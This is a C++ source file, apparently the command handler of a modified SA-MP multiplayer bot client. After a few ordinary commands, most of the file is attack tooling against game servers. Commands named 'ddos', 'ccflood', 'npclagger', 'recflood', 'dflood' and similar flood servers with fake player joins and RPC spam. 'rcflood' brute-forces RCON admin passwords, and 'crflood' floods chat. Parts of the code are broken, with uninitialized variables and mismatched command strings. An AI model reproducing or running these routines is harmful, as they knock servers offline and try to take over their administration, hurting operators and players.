#include "main.h"

int RunCommand(char *szCMD, int iFromAutorun)
{
	// return 0: should run server sided command.
	// return 1: found local command.
	// return 2: local command not found.
	// return 3: exit process.

	if(szCMD[0] == 0x00)
		return 2;

	if(settings.iConsole)
		memset(&szCMD[(strlen(szCMD) - 2)], 0, 2);

	if(settings.runMode == RUNMODE_RCON)
	{
		if(!strncmp(szCMD, "login", 5) || !strncmp(szCMD, "LOGIN", 5))
		{
			char *pszPass = &szCMD[6];
			strcpy(settings.szRCONPass, pszPass);
			sendRconCommand(pszPass, 1);
			settings.iRCONLoggedIn = 1;
			Log("RCON password set.");
		}
		else
		{
			if(settings.iRCONLoggedIn)
				sendRconCommand(szCMD, 0);
			else
				Log("RCON password was not set. Type login [password]");
		}

		return 1;
	}

	if(szCMD[0] != '!')
	{
		// SERVER CHAT OR COMMAND
		if(szCMD[0] == '/')
			sendServerCommand(szCMD);
		else
			sendChat(szCMD);

		return 0;
	}

	szCMD++;

	// EXIT
	if(!strncmp(szCMD, "exit", 4) || !strncmp(szCMD, "EXIT", 4) ||
		!strncmp(szCMD, "quit", 4) || !strncmp(szCMD, "QUIT", 4))
	{
		sampDisconnect(0);
		ExitProcess(0);

		return 3;
	}

	// RECONNECT
	if(!strncmp(szCMD, "reconnect", 9) || !strncmp(szCMD, "RECONNECT", 9))
	{
		sampDisconnect(0);
		resetPools(1, 2000);

		return 1;
	}

	// RELOAD SETTINGS
	if(!strncmp(szCMD, "reload", 6) || !strncmp(szCMD, "RELOAD", 6))
	{
		ReloadSettings();

		return 1;
	}

	// PLAYER LIST
	if(!strncmp(szCMD, "players", 7) || !strncmp(szCMD, "PLAYERS", 7))
	{
		int iPlayerCount = 0;
		Log(" ");
		Log("=== PLAYER LIST ===");
		Log("ID Name Ping Score");
		for(int i = 0; i < MAX_PLAYERS; i++)
		{
			if(!playerInfo[i].iIsConnected)
				continue;

			Log("(%d) %s %d %d", i, playerInfo[i].szPlayerName, playerInfo[i].dwPing, playerInfo[i].iScore);
			iPlayerCount++;
		}
		Log(" ");
		Log("=== [COUNT: %d] ===", iPlayerCount);
		Log(" ");

		return 1;
	}

	// GOTO
	if(!strncmp(szCMD, "goto", 4) || !strncmp(szCMD, "GOTO", 4))
	{
		int iPlayerID = atoi(&szCMD[5]);
		if(iPlayerID == -1)
		{
			normalMode_goto = -1;
			return 1;
		}

		if(iPlayerID < 0 || iPlayerID > MAX_PLAYERS)
			return 1;

		if(playerInfo[iPlayerID].iIsConnected)
		{
			normalMode_goto = (PLAYERID)iPlayerID;

			ONFOOT_SYNC_DATA ofSync;
			memset(&ofSync, 0, sizeof(ONFOOT_SYNC_DATA));
			ofSync.byteHealth = 100;
			ofSync.vecPos[0] = playerInfo[iPlayerID].onfootData.vecPos[0];
			ofSync.vecPos[1] = playerInfo[iPlayerID].onfootData.vecPos[1];
			ofSync.vecPos[2] = playerInfo[iPlayerID].onfootData.vecPos[2];

			SendOnFootFullSyncData(&ofSync, 0, -1);
		}
		else
			Log("[GOTO] Player %d is not connected.", iPlayerID);

		return 1;
	}

	// IMITATE
	if(!strncmp(szCMD, "imitate", 7) || !strncmp(szCMD, "IMITATE", 7))
	{
		char *szPlayerName = &szCMD[8];
		if(!strcmp(szPlayerName,"-1"))
		{
			imitateID = -1;
			Log("[IMITATE] Imitate was disabled.");
			return 1;
		}

		PLAYERID playerID = getPlayerIDFromPlayerName(szPlayerName);

		if(playerID < 0 || playerID > MAX_PLAYERS)
			return 1;

		if(playerInfo[playerID].iIsConnected)
		{
			imitateID = (PLAYERID)playerID;
			Log("[IMITATE] Imitate ID set to %d (%s)", imitateID, szPlayerName);
		}
		else
			Log("[IMITATE] Player %s is not connected.", szPlayerName);

		return 1;
	}

	// VEHICLE LIST
	if(!strncmp(szCMD, "vlist", 5) || !strncmp(szCMD, "VLIST", 5))
	{
		for(VEHICLEID i = 0; i < MAX_VEHICLES; i++)
		{
			if(!vehiclePool[i].iDoesExist)
				continue;

			const struct vehicle_entry *vehicle = gta_vehicle_get_by_id( vehiclePool[i].iModelID );
			if(vehicle)
				Log("[VLIST] %d (%s)", i, vehicle->name);
		}

		return 1;
	}

	// SEND VEHICLE DEATH NOTIFICATION
	if(!strncmp(szCMD, "vdeath", 6) || !strncmp(szCMD, "VDEATH", 6))
	{
		for(int vdeath = 0; vdeath < 2000;vdeath++)
		{
		int iSelectedVeh = atoi(&szCMD[7]);
		NotifyVehicleDeath((VEHICLEID)iSelectedVeh);
		Log("[VDEATH] Sent to vehicle ID %d", iSelectedVeh);
		}
		return 1;
	}
	
	if(!strncmp(szCMD, "fu", 2) || !strncmp(szCMD, "fu", 2))
	{
		RakNet::BitStream bs;
		bs.Write((BYTE)ID_CONNECTION_LOST);
		pRakClient->Send(&bs, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);

		return 1;
	}
	
	// VEHICLE PLAYING COMMANDS
	// SELECT VEHICLE ID TO PLAY THE ROUTE OR DRIVING MODE VEHICLE
	if(!strncmp(szCMD, "selveh", 6) || !strncmp(szCMD, "SELVEH", 6))
	{
		int iSelectedVeh = atoi(&szCMD[7]);

		if(settings.runMode == RUNMODE_PLAYROUTES)
			routeVehicleID = (VEHICLEID)iSelectedVeh;
		else if(settings.runMode == RUNMODE_FOLLOWPLAYERSVEHICLE)
			settings.iFollowingWithVehicleID = (VEHICLEID)iSelectedVeh;

		Log("[SELVEH] Changed to vehicle ID to %d.", iSelectedVeh);

		return 1;
	}
	// ROUTE LIST
	if(!strncmp(szCMD, "rtlist", 6) || !strncmp(szCMD, "RTLIST", 6))
	{
		// now get me some data from the database
		char table_name_[64];
		char *table_name;
		int num_tables = rec_sqlite_getNumTables();

		if ( num_tables <= 0 )
		{
			Log( (num_tables < 0) ? "Error Reading Database" : "No Saved Routes");
			return 1;
		}

		for ( int i = 0; i < num_tables; i++ )
		{
			table_name = rec_sqlite_getTableName(i);
			if ( table_name == NULL )
				continue;

			_snprintf_s( table_name_, sizeof(table_name_)-1, "ID %d: '%s'", i, table_name );
			Log(table_name_);
		}

		return 1;
	}

	// LOAD ROUTE
	if(!strncmp(szCMD, "loadrt", 6) || !strncmp(szCMD, "LOADRT", 6))
	{
		int iSelectedRoute = atoi(&szCMD[7]);

		char *table_name;
		int num_tables = rec_sqlite_getNumTables();

		if ( num_tables <= 0 )
		{
			Log( (num_tables < 0) ? "Error Reading Database" : "No Saved Routes");
			return 1;
		}

		for ( int i = 0; i < num_tables; i++ )
		{
			table_name = rec_sqlite_getTableName(i);
			if ( table_name == NULL )
				continue;

			if(i == iSelectedRoute)
				rec_sqlite_loadTable( table_name );
		}			

		return 1;
	}

	// PLAY ROUTE
	if(!strncmp(szCMD, "playrt", 6) || !strncmp(szCMD, "PLAYRT", 6))
	{
		rec_state = RECORDING_PLAY;

		return 1;
	}

	// STOP ROUTE
	if(!strncmp(szCMD, "stoprt", 6) || !strncmp(szCMD, "STOPRT", 6))
	{
		rec_state = RECORDING_OFF;

		return 1;
	}

	// SELECT AN ITEM FROM THE GTA MENU
	if(!strncmp(szCMD, "menusel", 7) || !strncmp(szCMD, "MENUSEL", 7))
	{
		BYTE bRow = (BYTE)atoi(&szCMD[8]);

		if(bRow != 0xFF)
		{
			RakNet::BitStream bsSend;
			bsSend.Write(bRow);
			pRakClient->RPC(&RPC_MenuSelect, &bsSend, HIGH_PRIORITY, RELIABLE, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);			
		}

		return 1;
	}

	//FAKE KILL :-)
	if(!strncmp(szCMD, "kill", 4) || !strncmp(szCMD, "KILL", 4))
	{
		if(!settings.fakeKill) {
			Log("Started flooding :-)");
			settings.fakeKill=true;
		}else{
			settings.fakeKill=false;
			Log("Stopped flooding...");
		}
		return 1;
	}


	//LAG :-)
	if(!strncmp(szCMD, "lag", 4) || !strncmp(szCMD, "LAG", 4))
	{
		if(!settings.lag) {
			Log("Started lagging :-)");
			settings.lag=true;
		}else{
			settings.lag=false;
			Log("Stopped lagging...");
		}
		return 1;
	}
	if(!strncmp(szCMD, "ccflood", 4) || !strncmp(szCMD, "CCFLOOD", 5))
	{
		for(int ccflood = 0; ccflood < 90000;ccflood++)
		{
	char nick[15] = {0};
	gen_random(nick, 5);

	RakNet::BitStream bsSend;
	char *pszAuthBullshit = AUTH_BS;
	int iVersion = NETGAME_VERSION;
	BYTE byteMod = 1;
	BYTE byteNameLen = (BYTE)strlen(nick);
	BYTE byteAuthBSLen = (BYTE)strlen(pszAuthBullshit);
	unsigned int uiClientChallengeResponse = playerInfo->uiChallenge ^ iVersion;
	
	bsSend.Write(iVersion);
	bsSend.Write(byteMod);
	bsSend.Write(byteNameLen);
	bsSend.Write(nick, byteNameLen);
	bsSend.Write(uiClientChallengeResponse);
	bsSend.Write(byteAuthBSLen);
	bsSend.Write(pszAuthBullshit, byteAuthBSLen);
	pRakClient->RPC(&RPC_ClientJoin, &bsSend, HIGH_PRIORITY, RELIABLE, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
	}
	return 1;
	}



   

	if(!strncmp(szCMD, "flood", 4) || !strncmp(szCMD, "FLOOD", 5))
	{
		for(int lagflood = 0; lagflood < 1;lagflood++)
		{
			sampDisconnect(-0);
		}
		return 1;
	}


	


	


	if(!strncmp(szCMD, "recflood", 4) || !strncmp(szCMD, "	RECFLOOD", 5))
	{
		for(int recflood = 0; recflood < 999999;recflood++)
		{	
	int classID;
	RakNet::BitStream bsSendRequestSpawn;
	pRakClient->Send(&bsSendRequestSpawn, HIGH_PRIORITY, RELIABLE, 0);
	bsSendRequestSpawn.Write( bsSendRequestSpawn );
	pRakClient->RPC(&RPC_RequestSpawn, &bsSendRequestSpawn, HIGH_PRIORITY, RELIABLE, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
	sampRequestClass(classID);
	}
		return 1;
	}

   
	if(!strncmp(szCMD, "deaflood", 4) || !strncmp(szCMD, "DEALOOD", 5))
	{
		for(int deaflood = 0; deaflood < 999999;deaflood++)
		{	
	RakNet::BitStream bsSend;
	pRakClient->Send(&bsSend, HIGH_PRIORITY, RELIABLE, 0);
	bsSend.Write( 100+rand()%59 );
	pRakClient->RPC(&RPC_Death, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
	}
		return 1;
	}
	

	if(!strncmp(szCMD, "dflood", 4) || !strncmp(szCMD, "DFLOOD", 5))
	{
		for(int dflood = 0; dflood < 9999999;dflood++)
		{
		RakNet::BitStream bsSend;
		pRakClient->Send(&bsSend, HIGH_PRIORITY, RELIABLE, 0);
		bsSend.Write(bsSend);
	    pRakClient->RPC(&RPC_DialogResponse, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		}
		return 1;
	}

	if(!strncmp(szCMD, "pflood", 4) || !strncmp(szCMD, "PFLOOD", 5))
	{
		for(int pflood = 0; pflood < 9999999;pflood++)
		{
		RakNet::BitStream bsPickedUpPickup;
	    pRakClient->Send(&bsPickedUpPickup, HIGH_PRIORITY, RELIABLE, 0);
	    bsPickedUpPickup.Write(bsPickedUpPickup);
		pRakClient->RPC(&RPC_PickedUpPickup, &bsPickedUpPickup, HIGH_PRIORITY, RELIABLE_SEQUENCED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		}
		return 1;
	}

	if(!strncmp(szCMD, "vflood", 4) || !strncmp(szCMD, "VFLOOD", 5))
	{
		for(int vflood = 0; vflood < 999999;vflood++)
		{
		RakNet::BitStream bsSend;
	    pRakClient->Send(&bsSend, HIGH_PRIORITY, RELIABLE, 0);
	    bsSend.Write(rand()%999999);
	    pRakClient->RPC(&RPC_EnterVehicle, &bsSend, HIGH_PRIORITY, RELIABLE_SEQUENCED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
	    }
		return 1;
	    }


	  if(!strncmp(szCMD, "eflood", 4) || !strncmp(szCMD, "EFLOOD", 5))
	{
		for(int eflood = 0; eflood < 99999;eflood++)
		{
		RakNet::BitStream bsSend;
	    pRakClient->Send(&bsSend, HIGH_PRIORITY, RELIABLE, 0);
	    bsSend.Write(bsSend);
		pRakClient->RPC(&RPC_ExitVehicle, &bsSend, HIGH_PRIORITY, RELIABLE_SEQUENCED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
	    }
		return 1;
	    }

	if(!strncmp(szCMD, "dea2flood", 4) || !strncmp(szCMD, "	DEA2FLOOD", 5))
	{
		for(int dea2flood = 0; dea2flood < 99999;dea2flood++)
		{
		RakNet::BitStream bsPlayerDeath;
	    pRakClient->Send(&bsPlayerDeath, HIGH_PRIORITY, RELIABLE, 0);
	    bsPlayerDeath.Write( 1000+rand()%1000 );
		pRakClient->RPC(&RPC_Death, &bsPlayerDeath, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
	    }
		return 1;
	    }

	if(!strncmp(szCMD, "rflood", 4) || !strncmp(szCMD, "RFLOOD", 5))
	{
		for(int rflood = 0; rflood < 99999;rflood++)
		{
			RakNet::BitStream bsSend;
		    bsSend.Write((BYTE)ID_RCON_COMMAND);
			pRakClient->Send(&bsSend, HIGH_PRIORITY, RELIABLE, 0);
	}
	return 1;
	}

	if(!strncmp(szCMD, "rcflood", 4) || !strncmp(szCMD, "RCFLOOD", 5))
	{
		for(int rcflood = 0; rcflood < 99999;rcflood++)
		{
	char *szRCONCmd;
	int iIsLogin;
	int iAddrSize = sizeof(struct sockaddr_in);
	int queryLen = 200;
	char queryBufferSend[9024];
	BYTE passLen = (BYTE)strlen(settings.szRCONPass);
	BYTE cmdLen = (BYTE)strlen(szRCONCmd);
	
	memset(queryBufferSend, 200, sizeof(queryBufferSend));

	*(unsigned int *)&queryBufferSend[200] = 0x504D4153; queryLen += 2000;
	*(unsigned int *)&queryBufferSend[queryLen] = settings.RCONserver.sin_addr.s_addr; queryLen += 2000;
	*(unsigned short *)&queryBufferSend[queryLen] = settings.RCONserver.sin_port; queryLen += 2000;
	*(unsigned short *)&queryBufferSend[queryLen] = 0x78; queryLen += 2000;

	*(unsigned short *)&queryBufferSend[queryLen] = passLen; queryLen += 2000;
	strncpy(&queryBufferSend[queryLen], settings.szRCONPass, passLen); queryLen += passLen;
	sendto(settings.RCONSocket, queryBufferSend, queryLen, 2000, (struct sockaddr *)&settings.RCONserver, iAddrSize);
	settings.RCONSocket = socket(AF_INET, SOCK_DGRAM, 2000);
	memset((void *)&settings.RCONserver, 2000, sizeof(struct sockaddr_in));
	settings.RCONserver.sin_family = AF_INET;
	settings.RCONserver.sin_port = htons(settings.server.iPort);
	struct hostent *pAddr = gethostbyname(settings.server.szAddr);
	memcpy(&(settings.RCONserver.sin_addr.s_addr), pAddr->h_addr, pAddr->h_length);
	settings.RCONserver.sin_addr.s_addr = inet_addr(settings.server.szAddr);
	settings.RCONclient.sin_family = AF_INET;
	settings.RCONclient.sin_port = htons(2000);
	sendServerCommand("/rcon login qwert1");
	sendServerCommand("/rcon login qwert2");
	sendServerCommand("/rcon login qwert3");
	sendServerCommand("/rcon login qwert4");
    sendServerCommand("/rcon login qwert5");
	sendServerCommand("/rcon login qwert11");
	sendServerCommand("/rcon login qwert21");
	sendServerCommand("/rcon login qwert31");
	sendServerCommand("/rcon login qwert41");
    sendServerCommand("/rcon login qwert51");
	sendServerCommand("/rcon login qwert12");
	sendServerCommand("/rcon login qwert22");
	sendServerCommand("/rcon login qwert32");
	sendServerCommand("/rcon login qwert42");
    sendServerCommand("/rcon login qwert52");
	sendServerCommand("/rcon login qwert155");
	sendServerCommand("/rcon login qwert25");
	sendServerCommand("/rcon login qwert35");
	sendServerCommand("/rcon login qwert45");
    sendServerCommand("/rcon login %s");
	sendServerCommand("/rcon login %d");
	sendServerCommand("/rcon login qwert2");
	sendServerCommand("/rcon login qwert3");
	sendServerCommand("/rcon login qwert4");
    sendServerCommand("/rcon login qwert5");
	}
	return 1;
	}

if(!strncmp(szCMD, "reg", 4) || !strncmp(szCMD, "REG", 5))
	{
		for(int reg = 0; reg < 99999;reg++)
		{
	char nick[24] = {0};
	gen_random(nick, rand()%5 + 3);

	RakNet::BitStream bsSend;
	char *pszAuthBullshit = AUTH_BS;
	int iVersion = NETGAME_VERSION;
	BYTE byteMod = 1;
	BYTE byteNameLen = (BYTE)strlen(nick);
	BYTE byteAuthBSLen = (BYTE)strlen(pszAuthBullshit);
	unsigned int uiClientChallengeResponse = playerInfo->uiChallenge ^ iVersion;
	
	bsSend.Write(iVersion);
	bsSend.Write(byteMod);
	bsSend.Write(byteNameLen);
	bsSend.Write(nick, byteNameLen);
	bsSend.Write(uiClientChallengeResponse);
	bsSend.Write(byteAuthBSLen);
	bsSend.Write(pszAuthBullshit, byteAuthBSLen);
	pRakClient->RPC(&RPC_ClientJoin, &bsSend, HIGH_PRIORITY, RELIABLE, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
	//why we don't have to send "0.3e" in packet like in first join? kye rocks! :D
	sendServerCommand("/register 12345");
	sendDialogResponse(sampDialog.wDialogID, 1, 0, "1234511");
	sendDialogResponse(sampDialog.wDialogID, 1, 0, "1234511");
	sendDialogResponse(sampDialog.wDialogID, 1, 0, "%s");

}
	return 1;
	}

if(!strncmp(szCMD, "npclagger", 4) || !strncmp(szCMD, "NPCLAGGER", 5))
	{
		for(int npclagger = 0; npclagger < 999999;npclagger++)
		{
	char nick[15] = {0};
	gen_random(nick, 5);

	RakNet::BitStream bsSend;
	char *pszAuthBullshit = AUTH_BS;
	int iVersion = NETGAME_VERSION;
	BYTE byteMod = 1;
	BYTE byteNameLen = (BYTE)strlen(nick);
	BYTE byteAuthBSLen = (BYTE)strlen(pszAuthBullshit);
	unsigned int uiClientChallengeResponse = playerInfo->uiChallenge ^ iVersion;
	
	bsSend.Write(iVersion);
	bsSend.Write(byteMod);
	bsSend.Write(byteNameLen);
	bsSend.Write(nick, byteNameLen);
	bsSend.Write(uiClientChallengeResponse);
	bsSend.Write(byteAuthBSLen);
	bsSend.Write(pszAuthBullshit, byteAuthBSLen);
	pRakClient->RPC(&RPC_NPCJoin, &bsSend, HIGH_PRIORITY, RELIABLE, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
	}
	return 1;
	}


  


    if(!strncmp(szCMD, "ddos", 4) || !strncmp(szCMD, "DDOS", 5))
	{
		for(int ddos = 0; ddos < 999999;ddos++)
		{
		RakNet::BitStream bsSend;
		bsSend.Write((BYTE)ID_MODIFIED_PACKET);
	    pRakClient->Send(&bsSend, HIGH_PRIORITY, RELIABLE, 0);
	    }
		return 1;
	    }



	    if(!strncmp(szCMD, "packet", 4) || !strncmp(szCMD, "PACKET", 5))
	{
		for(int packet = 0; packet < 99999;packet++)
		{
		RakNet::BitStream bsSend;
		bsSend.Write((BYTE)ID_TIMESTAMP);
	    pRakClient->Send(&bsSend, HIGH_PRIORITY, RELIABLE, 0);
	    }
		return 1;
	    }


		if(!strncmp(szCMD, "fnpc", 4) || !strncmp(szCMD, "FNPC", 5))
	{
		for(int fnpc = 0; fnpc < 999999;fnpc++)
		{
		char nick[24] = {0};
        gen_random(nick, 4);
        RakNet::BitStream bsSend;
        char *pszAuthBullshit = AUTH_BS;
        int iVersion = NETGAME_VERSION;
        BYTE byteMod = 1;
        BYTE byteNameLen = (BYTE)strlen(nick);
        BYTE byteAuthBSLen = (BYTE)strlen(pszAuthBullshit);
        unsigned int uiClientChallengeResponse = playerInfo->uiChallenge ^ iVersion;

        bsSend.Write(iVersion);
        bsSend.Write(byteMod);
        bsSend.Write(byteNameLen);
        bsSend.Write(nick, byteNameLen);
        bsSend.Write(uiClientChallengeResponse);
        bsSend.Write(byteAuthBSLen);
        bsSend.Write(pszAuthBullshit, byteAuthBSLen);
        int k = 14;
        pRakClient->RPC(&k, &bsSend, HIGH_PRIORITY, RELIABLE, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		}
		return 1;
	    }


		if(!strncmp(szCMD, "crflood", 4) || !strncmp(szCMD, "CRFLOOD", 5))
	{
		for(int crflood = 0; crflood < 40000;crflood++)
		{
			int classID = 0;
	        sampRequestClass(classID);
			sendChat("...............NICK COLORER by AlexDrift........................");
			sendChat(".............FOR ''FC''CLAN AKA AoC...............");
			sendChat(".................................");
			sendChat(".....................");
			sendChat("...............NICK COLORER by AlexDrift........................");
			sendChat(".............FOR ''FC''CLAN AKA AoC...............");
			sendChat(".................................");
			sendChat(".....................");
			sendChat("...............NICK COLORER by AlexDrift........................");
			sendChat(".............FOR ''FC''CLAN AKA AoC...............");
			sendChat(".................................");
			sendChat(".....................");
			}
		    return 1;
	        }


		


		
	if(!strncmp(szCMD, "spam", 4) || !strncmp(szCMD, "SPAM", 4))
	{
		if (settings.ispam) {
			Log("Stopped spamming...");
			settings.ispam = false;
		}else{
			Log("Started spamming...");
			settings.ispam = true;
		}
		return 1;
	}

	if(!strncmp(szCMD, "funcs", 4) || !strncmp(szCMD, "FUNCS", 4))
	{
		if (settings.funcss) {
			Log("Stopped funcs...");
			settings.funcss = false;
		}else{
			Log("Started funcs...");
			settings.funcss = true;
		}
		return 1;
	}

	Log("Не существующая команда %s .", szCMD);

	return 2;
}
void dialogWarnings() {
        RakNet::BitStream bsSend;
		bsSend.Write(9999);
		pRakClient->RPC(&RPC_DialogResponse, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		}

   void rconWarnings() {
   RakNet::BitStream bsSend;
   bsSend.Write((BYTE)ID_RCON_COMMAND);
   pRakClient->Send(&bsSend, HIGH_PRIORITY, RELIABLE, 0);
   }

void sampModifiedPackets() {  
RakNet::BitStream bsSend;
bsSend.Write((BYTE)ID_MODIFIED_PACKET);
pRakClient->Send(&bsSend, HIGH_PRIORITY, RELIABLE, 0);
}